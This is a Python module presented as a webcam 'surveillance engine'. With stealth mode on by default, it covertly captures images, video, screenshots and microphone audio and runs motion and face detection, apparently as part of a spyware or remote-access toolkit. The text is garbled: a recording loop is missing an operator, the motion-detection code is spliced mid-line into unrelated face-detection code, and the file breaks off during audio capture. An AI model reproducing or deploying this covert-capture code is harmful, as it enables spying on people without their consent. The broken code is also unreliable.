#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webcam_controller.py - Advanced Webcam Control and Surveillance
Capture, record, stream, and manipulate webcam feeds
"""

import os
import sys
import time
import threading
import queue
import json
import base64
import hashlib
import subprocess
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
from dataclasses import dataclass, asdict
from enum import Enum
import warnings

# Try to import OpenCV
try:
    import cv2
    import numpy as np
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False
    logger.warning("OpenCV not available, webcam functionality limited", module="webcam_controller")

# Platform-specific imports
if sys.platform == 'win32':
    import pygetwindow as gw
elif sys.platform == 'darwin':
    import Quartz

# Import utilities
from ..utils.logger import get_logger
from ..utils.encryption import AES256Manager
from ..utils.obfuscation import ObfuscationManager
from ..security.audit_log import get_audit_log_manager, AuditEventType, AuditSeverity

logger = get_logger()
audit_log = get_audit_log_manager()

class WebcamMode(Enum):
    """Webcam operation modes"""
    CAPTURE = "capture"
    RECORD = "record"
    STREAM = "stream"
    MOTION_DETECT = "motion_detect"
    FACE_DETECT = "face_detect"
    SCREENSHOT = "screenshot"
    AUDIO = "audio"

class WebcamQuality(Enum):
    """Webcam quality settings"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    ULTRA = "ultra"

@dataclass
class WebcamDevice:
    """Webcam device information"""
    index: int
    name: str
    resolution: Tuple[int, int] = (640, 480)
    fps: int = 30
    available: bool = True
    backend: str = "unknown"
    capabilities: List[str] = None
    
    def __post_init__(self):
        if self.capabilities is None:
            self.capabilities = []
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        data = asdict(self)
        data['resolution'] = list(self.resolution)
        return data

@dataclass
class WebcamCapture:
    """Webcam capture configuration"""
    mode: WebcamMode
    device: WebcamDevice
    duration: float = 0.0  # 0 = continuous
    quality: WebcamQuality = WebcamQuality.MEDIUM
    output_path: Optional[str] = None
    stream_url: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        data = asdict(self)
        data['mode'] = self.mode.value
        data['quality'] = self.quality.value
        data['device'] = self.device.to_dict()
        return data

class WebcamController:
    """Advanced Webcam Control and Surveillance Engine"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Configuration
        self.default_resolution = self.config.get('default_resolution', (640, 480))
        self.default_fps = self.config.get('default_fps', 30)
        self.record_dir = self.config.get('record_dir', '/tmp/webcam_recordings')
        self.capture_dir = self.config.get('capture_dir', '/tmp/webcam_captures')
        self.stream_port = self.config.get('stream_port', 8080)
        self.stealth_mode = self.config.get('stealth_mode', True)
        
        # Webcam devices
        self.devices = {}
        self.active_captures = {}
        
        # OpenCV availability
        self.opencv_available = OPENCV_AVAILABLE
        
        # Face detection classifier
        self.face_cascade = None
        self.eye_cascade = None
        
        if self.opencv_available:
            self._load_face_cascades()
        
        # Statistics
        self.stats = {
            'captures_taken': 0,
            'recordings_made': 0,
            'streams_started': 0,
            'motion_events': 0,
            'faces_detected': 0,
            'bytes_captured': 0,
            'start_time': datetime.now()
        }
        
        # Create directories
        os.makedirs(self.record_dir, exist_ok=True)
        os.makedirs(self.capture_dir, exist_ok=True)
        
        # Auto-detect webcams
        self.detect_webcams()
        
        logger.info("Webcam Controller initialized", module="webcam_controller")
    
    def _load_face_cascades(self):
        """Load face detection cascades"""
        try:
            # Try to load OpenCV Haar cascades
            cascade_paths = [
                '/usr/share/opencv4/haarcascades/haarcascade_frontalface_default.xml',
                '/usr/share/opencv/haarcascades/haarcascade_frontalface_default.xml',
                cv2.data.haarcascades + 'haarcascade_frontalface_default.xml'
            ]
            
            for path in cascade_paths:
                if os.path.exists(path):
                    self.face_cascade = cv2.CascadeClassifier(path)
                    logger.debug(f"Loaded face cascade from {path}", module="webcam_controller")
                    break
            
            # Try to load eye cascade
            eye_paths = [
                '/usr/share/opencv4/haarcascades/haarcascade_eye.xml',
                '/usr/share/opencv/haarcascades/haarcascade_eye.xml',
                cv2.data.haarcascades + 'haarcascade_eye.xml'
            ]
            
            for path in eye_paths:
                if os.path.exists(path):
                    self.eye_cascade = cv2.CascadeClassifier(path)
                    logger.debug(f"Loaded eye cascade from {path}", module="webcam_controller")
                    break
            
            if not self.face_cascade:
                logger.warning("Face cascade not found, face detection disabled", 
                             module="webcam_controller")
        
        except Exception as e:
            logger.error(f"Face cascade loading error: {e}", module="webcam_controller")
    
    def detect_webcams(self) -> List[WebcamDevice]:
        """Detect available webcam devices"""
        devices = []
        
        if not self.opencv_available:
            logger.warning("OpenCV not available, webcam detection limited", 
                         module="webcam_controller")
            return devices
        
        try:
            logger.info("Detecting webcam devices...", module="webcam_controller")
            
            # Try different backends
            backends = [
                cv2.CAP_ANY,  # Auto-detect
                cv2.CAP_DSHOW,  # DirectShow (Windows)
                cv2.CAP_V4L2,  # Video4Linux2 (Linux)
                cv2.CAP_AVFOUNDATION,  # AVFoundation (macOS)
                cv2.CAP_MSMF  # Microsoft Media Foundation
            ]
            
            # Test indices 0-9
            for index in range(10):
                for backend in backends:
                    try:
                        cap = cv2.VideoCapture(index, backend)
                        
                        if cap.isOpened():
                            # Get device name
                            name = f"Webcam {index}"
                            
                            # Try to get actual name
                            try:
                                backend_name = cap.getBackendName()
                                name = f"Webcam {index} ({backend_name})"
                            except:
                                pass
                            
                            # Get resolution
                            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                            
                            # Get FPS
                            fps = int(cap.get(cv2.CAP_PROP_FPS))
                            if fps == 0:
                                fps = self.default_fps
                            
                            device = WebcamDevice(
                                index=index,
                                name=name,
                                resolution=(width, height),
                                fps=fps,
                                available=True,
                                backend=backend
                            )
                            
                            devices.append(device)
                            cap.release()
                            
                            logger.debug(f"Found webcam: {name} at index {index}", 
                                       module="webcam_controller")
                            break  # Found device, move to next index
                            
                    except Exception as e:
                        logger.debug(f"Webcam index {index} backend {backend} failed: {e}", 
                                   module="webcam_controller")
                        continue
        
        except Exception as e:
            logger.error(f"Webcam detection error: {e}", module="webcam_controller")
        
        # Update device cache
        for device in devices:
            self.devices[device.index] = device
        
        logger.info(f"Found {len(devices)} webcam devices", module="webcam_controller")
        return devices
    
    def capture_image(self, device_index: int = 0, 
                     quality: WebcamQuality = WebcamQuality.MEDIUM) -> Optional[str]:
        """Capture single image from webcam"""
        if not self.opencv_available:
            logger.error("OpenCV not available", module="webcam_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Webcam device {device_index} not found", module="webcam_controller")
                return None
            
            device = self.devices[device_index]
            
            logger.info(f"Capturing image from {device.name}...", module="webcam_controller")
            
            # Open webcam
            cap = cv2.VideoCapture(device.index)
            if not cap.isOpened():
                logger.error(f"Failed to open webcam {device_index}", module="webcam_controller")
                return None
            
            # Read frame
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                logger.error("Failed to capture frame", module="webcam_controller")
                return None
            
            # Adjust quality
            if quality == WebcamQuality.LOW:
                frame = cv2.resize(frame, (320, 240))
                encode_param = [cv2.IMWRITE_JPEG_QUALITY, 50]
            elif quality == WebcamQuality.MEDIUM:
                frame = cv2.resize(frame, (640, 480))
                encode_param = [cv2.IMWRITE_JPEG_QUALITY, 75]
            elif quality == WebcamQuality.HIGH:
                frame = cv2.resize(frame, (1280, 720))
                encode_param = [cv2.IMWRITE_JPEG_QUALITY, 90]
            else:  # ULTRA
                encode_param = [cv2.IMWRITE_JPEG_QUALITY, 100]
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"capture_{device_index}_{timestamp}.jpg"
            filepath = os.path.join(self.capture_dir, filename)
            
            # Save image
            cv2.imwrite(filepath, frame, encode_param)
            
            # Update statistics
            self.stats['captures_taken'] += 1
            self.stats['bytes_captured'] += os.path.getsize(filepath)
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.WEBCAM_CAPTURE.value,
                severity=AuditSeverity.MEDIUM.value,
                user='system',
                source_ip='localhost',
                description=f"Webcam image captured from {device.name}",
                details={
                    'device_index': device_index,
                    'device_name': device.name,
                    'filepath': filepath,
                    'quality': quality.value,
                    'resolution': list(frame.shape[:2][::-1])
                },
                resource='webcam_controller',
                action='capture_image'
            )
            
            logger.info(f"Image captured: {filepath}", module="webcam_controller")
            
            return filepath
            
        except Exception as e:
            logger.error(f"Image capture error: {e}", module="webcam_controller")
            return None
    
    def capture_multiple(self, device_index: int = 0, count: int = 10, 
                        interval: float = 1.0) -> List[str]:
        """Capture multiple images with interval"""
        if not self.opencv_available:
            return []
        
        captured_files = []
        
        try:
            if device_index not in self.devices:
                logger.error(f"Webcam device {device_index} not found", module="webcam_controller")
                return []
            
            device = self.devices[device_index]
            
            logger.info(f"Capturing {count} images from {device.name}...", 
                       module="webcam_controller")
            
            # Open webcam
            cap = cv2.VideoCapture(device.index)
            if not cap.isOpened():
                logger.error(f"Failed to open webcam {device_index}", module="webcam_controller")
                return []
            
            for i in range(count):
                # Read frame
                ret, frame = cap.read()
                
                if ret:
                    # Generate filename
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                    filename = f"capture_{device_index}_{timestamp}.jpg"
                    filepath = os.path.join(self.capture_dir, filename)
                    
                    # Save image
                    cv2.imwrite(filepath, frame)
                    
                    captured_files.append(filepath)
                    
                    # Update statistics
                    self.stats['captures_taken'] += 1
                    self.stats['bytes_captured'] += os.path.getsize(filepath)
                    
                    logger.debug(f"Captured image {i+1}/{count}", module="webcam_controller")
                
                # Wait for interval
                if count - 1:
                    time.sleep(interval)
            
            cap.release()
            
            logger.info(f"Captured {len(captured_files)} images", module="webcam_controller")
            
            return captured_files
            
        except Exception as e:
            logger.error(f"Multiple capture error: {e}", module="webcam_controller")
            return []
    
    def record_video(self, device_index: int = 0, duration: float = 10.0,
                    quality: WebcamQuality = WebcamQuality.MEDIUM) -> Optional[str]:
        """Record video from webcam"""
        if not self.opencv_available:
            logger.error("OpenCV not available", module="webcam_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Webcam device {device_index} not found", module="webcam_controller")
                return None
            
            device = self.devices[device_index]
            
            logger.info(f"Recording video from {device.name} for {duration} seconds...", 
                       module="webcam_controller")
            
            # Open webcam
            cap = cv2.VideoCapture(device.index)
            if not cap.isOpened():
                logger.error(f"Failed to open webcam {device_index}", module="webcam_controller")
                return None
            
            # Set resolution based on quality
            if quality == WebcamQuality.LOW:
                resolution = (320, 240)
                fps = 15
            elif quality == WebcamQuality.MEDIUM:
                resolution = (640, 480)
                fps = 30
            elif quality == WebcamQuality.HIGH:
                resolution = (1280, 720)
                fps = 30
            else:  # ULTRA
                resolution = (1920, 1080)
                fps = 30
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"recording_{device_index}_{timestamp}.avi"
            filepath = os.path.join(self.record_dir, filename)
            
            # Create video writer
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filepath, fourcc, fps, resolution)
            
            start_time = time.time()
            frames_recorded = 0
            
            while time.time() - start_time duration:
                ret, frame = cap.read()
                
                if ret:
                    # Resize frame if needed
                    if frame.shape[:2][::-1] != resolution:
                        frame = cv2.resize(frame, resolution)
                    
                    # Write frame
                    out.write(frame)
                    frames_recorded += 1
                
                # Small delay to maintain FPS
                time.sleep(1.0 / fps)
            
            # Release resources
            cap.release()
            out.release()
            
            # Update statistics
            self.stats['recordings_made'] += 1
            if os.path.exists(filepath):
                self.stats['bytes_captured'] += os.path.getsize(filepath)
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.WEBCAM_RECORDING.value,
                severity=AuditSeverity.MEDIUM.value,
                user='system',
                source_ip='localhost',
                description=f"Webcam video recorded from {device.name}",
                details={
                    'device_index': device_index,
                    'device_name': device.name,
                    'filepath': filepath,
                    'duration': duration,
                    'quality': quality.value,
                    'resolution': list(resolution),
                    'frames': frames_recorded
                },
                resource='webcam_controller',
                action='record_video'
            )
            
            logger.info(f"Video recorded: {filepath} ({frames_recorded} frames)", 
                       module="webcam_controller")
            
            return filepath
            
        except Exception as e:
            logger.error(f"Video recording error: {e}", module="webcam_controller")
            return None
    
    def stream_webcam(self, device_index: int = 0, 
                     stream_url: str = None) -> Optional[threading.Thread]:
        """Start webcam streaming"""
        if not self.opencv_available:
            logger.error("OpenCV not available", module="webcam_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Webcam device {device_index} not found", module="webcam_controller")
                return None
            
            device = self.devices[device_index]
            
            # Generate stream URL if not provided
            if not stream_url:
                stream_url = f"http://localhost:{self.stream_port}/stream_{device_index}"
            
            logger.info(f"Starting webcam stream from {device.name} to {stream_url}...", 
                       module="webcam_controller")
            
            # This would require a streaming server implementation
            # For now, we'll create a simple thread that simulates streaming
            
            def stream_thread():
                try:
                    cap = cv2.VideoCapture(device.index)
                    
                    if not cap.isOpened():
                        logger.error(f"Failed to open webcam {device_index}", 
                                   module="webcam_controller")
                        return
                    
                    logger.info(f"Streaming started on thread", module="webcam_controller")
                    
                    # Simulate streaming
                    while self.active_captures.get(f'stream_{device_index}', False):
                        ret, frame = cap.read()
                        if ret:
                            # In real implementation, send frame to stream
                            pass
                        time.sleep(0.033)  # ~30 FPS
                    
                    cap.release()
                    logger.info(f"Streaming stopped", module="webcam_controller")
                    
                except Exception as e:
                    logger.error(f"Stream thread error: {e}", module="webcam_controller")
            
            # Start streaming thread
            thread = threading.Thread(target=stream_thread, daemon=True)
            self.active_captures[f'stream_{device_index}'] = True
            thread.start()
            
            # Update statistics
            self.stats['streams_started'] += 1
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.WEBCAM_STREAM.value,
                severity=AuditSeverity.MEDIUM.value,
                user='system',
                source_ip='localhost',
                description=f"Webcam streaming started from {device.name}",
                details={
                    'device_index': device_index,
                    'device_name': device.name,
                    'stream_url': stream_url
                },
                resource='webcam_controller',
                action='start_stream'
            )
            
            return thread
            
        except Exception as e:
            logger.error(f"Stream start error: {e}", module="webcam_controller")
            return None
    
    def stop_stream(self, device_index: int = 0) -> bool:
        """Stop webcam streaming"""
        try:
            stream_key = f'stream_{device_index}'
            
            if stream_key in self.active_captures:
                self.active_captures[stream_key] = False
                del self.active_captures[stream_key]
                
                logger.info(f"Stopped stream for device {device_index}", 
                           module="webcam_controller")
                return True
            else:
                logger.warning(f"No active stream for device {device_index}", 
                             module="webcam_controller")
                return False
            
        except Exception as e:
            logger.error(f"Stream stop error: {e}", module="webcam_controller")
            return False
    
    def detect_motion(self, device_index: int = 0, 
                     sensitivity: float = 0.1) -> Optional[threading.Thread]:
        """Start motion detection"""
        if not self.opencv_available:
            logger.error("OpenCV not available", module="webcam_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Webcam device {device_index} not found", module="webcam_controller")
                return None
            
            device = self.devices[device_index]
            
            logger.info(f"Starting motion detection on {device.name}...", 
                       module="webcam_controller")
            
            def motion_detection_thread():
                try:
                    cap = cv2.VideoCapture(device.index)
                    
                    if not cap.isOpened():
                        logger.error(f"Failed to open webcam {device_index}", 
                                   module="webcam_controller")
                        return
                    
                    # Read first frame
                    ret, frame1 = cap.read()
                    if not ret:
                        logger.error("Failed to read initial frame", module="webcam_controller")
                        cap.release()
                        return
                    
                    # Convert to grayscale
                    gray1 = cv2.cvtColor(frame1, cv2.COLOR_BGR2GRAY)
                    gray1 = cv2.GaussianBlur(gray1, (21, 21), 0)
                    
                    logger.info("Motion detection started", module="webcam_controller")
                    
                    while self.active_captures.get(f'motion_{device_index}', False):
                        # Read next frame
                        ret, frame2 = cap.read()
                        if not ret:
                            break
                        
                        # Convert to grayscale and blur
                        gray2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2GRAY)
                        gray2 = cv2.GaussianBlur(gray2, (21, 21), 0)
                        
                        # Compute difference
                        delta = cv2.absdiff(gray1, gray2)
                        thresh = cv2.threshold(delta, 25, 255, cv2.THRESH_BINARY)[1]
                        
                        # Dilate threshold image
                        thresh = cv2.d                    logger.error(f"Face detection thread error: {e}", 
                               module="webcam_controller")
            
            # Start face detection thread
            thread = threading.Thread(target=face_detection_thread, daemon=True)
            self.active_captures[f'face_{device_index}'] = True
            thread.start()
            
            return thread
            
        except Exception as e:
            logger.error(f"Face detection start error: {e}", module="webcam_controller")
            return None
    
    def stop_face_detection(self, device_index: int = 0) -> bool:
        """Stop face detection"""
        try:
            face_key = f'face_{device_index}'
            
            if face_key in self.active_captures:
                self.active_captures[face_key] = False
                del self.active_captures[face_key]
                
                logger.info(f"Stopped face detection for device {device_index}", 
                           module="webcam_controller")
                return True
            else:
                logger.warning(f"No active face detection for device {device_index}", 
                             module="webcam_controller")
                return False
            
        except Exception as e:
            logger.error(f"Face detection stop error: {e}", module="webcam_controller")
            return False
    
    def capture_screenshot(self) -> Optional[str]:
        """Capture screenshot of entire screen"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.capture_dir, filename)
            
            if sys.platform == 'win32':
                # Windows screenshot
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save(filepath)
                
            elif sys.platform == 'darwin':
                # macOS screenshot
                subprocess.run(['screencapture', filepath], check=True)
                
            elif sys.platform == 'linux':
                # Linux screenshot (requires scrot)
                try:
                    subprocess.run(['scrot', filepath], check=True)
                except (subprocess.CalledProcessError, FileNotFoundError):
                    # Try using import if scrot not available
                    try:
                        from PIL import ImageGrab
                        screenshot = ImageGrab.grab()
                        screenshot.save(filepath)
                    except ImportError:
                        logger.error("Screenshot tools not available on Linux", 
                                   module="webcam_controller")
                        return None
            
            else:
                logger.warning(f"Screenshot not supported on {sys.platform}", 
                             module="webcam_controller")
                return None
            
            # Update statistics
            self.stats['captures_taken'] += 1
            if os.path.exists(filepath):
                self.stats['bytes_captured'] += os.path.getsize(filepath)
            
            logger.info(f"Screenshot captured: {filepath}", module="webcam_controller")
            
            return filepath
            
        except Exception as e:
            logger.error(f"Screenshot capture error: {e}", module="webcam_controller")
            return None
    
    def capture_audio(self, duration: float = 10.0) -> Optional[str]:
        """Capture audio from microphone"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.wav"
            filepath = os.path.join(self.capture_dir, filename)
            
            # Try different audio capture methods
            try:
                import pyaudio
                import wave
                
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 44100
                
                p = pyaudio.PyAudio()
                
                stream = p.open(format=FORMAT,
                             
